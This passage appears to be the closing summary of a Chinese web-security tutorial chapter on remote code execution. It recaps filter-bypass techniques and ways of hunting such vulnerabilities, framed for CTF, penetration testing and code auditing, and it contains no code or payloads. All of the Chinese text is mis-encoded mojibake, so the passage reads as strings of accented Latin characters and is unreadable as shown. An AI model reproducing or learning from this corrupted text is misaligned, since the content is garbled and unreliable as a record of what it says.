3.  **ç»•è¿‡æŠ€æœ¯**ï¼šç³»ç»Ÿå­¦ä¹ äº†ä»åŸºç¡€çš„é€šé…ç¬¦ã€ç¼–ç ç»•åˆ°é«˜çº§çš„ç»„åˆç»æŠ€ã€å¼‚æˆ–æ— å­—ç¬¦ç»•è¿‡çš„å¤šç§æ–¹æ³•ï¼Œå¹¶æŒæ¡äº†æ— å›æ˜¾æ¼æ´çš„åˆ©ç”¨æ€è·¯ã€‚
4.  **æŒ–æ˜æ€è·¯**ï¼šå»ºç«‹äº†ç™½ç›’ä»£ç å®¡è®¡ä¸­æœç´¢å±é™©å‡½æ•°ã€å›æº¯å‚æ•°ã€åˆ†æè¿‡æ»¤çš„é€»è¾‘ï¼Œä»¥åŠé»‘ç›’æµ‹è¯•ä¸­å…³æ³¨é«˜å±åŠŸèƒ½ç‚¹ã€ç»“åˆå·²çŸ¥æ¼æ´è¿›è¡Œæµ‹è¯•çš„æ–¹æ³•ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_278.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_280.png)

RCEæ¼æ´æ˜¯Webå®‰å…¨ä¸­å±é™©æ€§æœ€é«˜ã€ä¹Ÿæœ€è€ƒéªŒæ”»å‡»è€…æŠ€å·§çš„æ¼æ´ä¹‹ä¸€ã€‚æ·±å…¥ç†è§£æœ¬ç« å†…å®¹ï¼Œæ— è®ºæ˜¯å¯¹äºCTFç«èµ›ã€æ¸—é€æµ‹è¯•è¿˜æ˜¯ä»£ç å®¡è®¡å·¥ä½œï¼Œéƒ½æœ‰ç€è‡³å…³é‡è¦çš„æ„ä¹‰ã€‚